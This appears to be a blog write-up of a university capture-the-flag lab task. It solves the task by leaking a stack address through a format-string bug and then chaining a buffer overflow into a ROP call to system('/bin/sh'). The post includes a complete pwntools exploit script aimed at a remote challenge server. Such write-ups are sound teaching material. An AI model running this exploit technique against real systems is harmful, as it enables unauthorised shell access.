---
layout: post
title:  UNIBUC_RE_lab_6_task_3
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: ROP challenge with format string attack to leak an address from the stack
categories:
- UNIBUC RE
---

ROP challenge with format string attack to leak an address from the stack

The second printf is the vulnerable one
![](/assets/img/2022-09-02-13-10-19.png)
Also like in all the previous tasks we have a buffer overflow vulnerability.

We only need to leak an address on the stack and then use it to compute an offset to system and kill it.
The same offset as previous examples:
![](/assets/img/2022-09-02-13-12-57.png)

Finding leaks:
![](/assets/img/2022-09-02-13-37-29.png)

Confirming good leak:
![](/assets/img/2022-09-02-13-37-51.png)

Now we only need to compute the rop chain and we're good.

Offset finding (for getting the address):
```
a='0x7ffe3accb1a0-0x7f96b6537780-0x7f96b62686e0-0x7f96b675c700-0xd-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x7878787878787878-0x4011b8-(nil)-(nil)-0x7ffe3accd8e0-0x401281-0x401290-0x401070-(nil)-0x7f96b61e1690-0x401290-0x7f96b6192830-0x7ffe3accd9c8-0x7ffe3accd9c8-0x1b62fda28-xxxxxxxx\xb8\x11'
a.split('-').index('0x7f96b61e1690')
```

Offset finding (for getting the system offset):
![](/assets/img/2022-09-02-13-46-51.png)
`hex(0x7f96b61e1690-0x7f96b61b7390)`
0x2a300


Find rops using `ROPgadget --binary task03`



Remote:
![](/assets/img/2022-09-02-14-02-35.png)

Script:
```
from pwn import *

from ctypes import *
e = ELF('./task03')
pop_rdi=0x04012eb
bin_sh=0x40302a

io=remote('45.76.91.112',10063)

#io = process("./task03",env={"LD_PRELOAD" : "./libc.so"})

io.recvuntil("name")
#gdb.attach(io,'break *0x401225  ')
io.sendline(32*b'%p-'+40*b'x'+p64(e.symbols['main2']))
io.recvuntil(b'there, ')
temp_recv=io.recvline()
puts_addr=int(temp_recv.split(b'-')[26],16)
print(hex(puts_addr))
system_address=puts_addr-0x2a300
print('puts end ----')
io.sendline(128*b'a'+8*b'x'+p64(pop_rdi)+p64(bin_sh)+p64(system_address))



io.interactive()

```
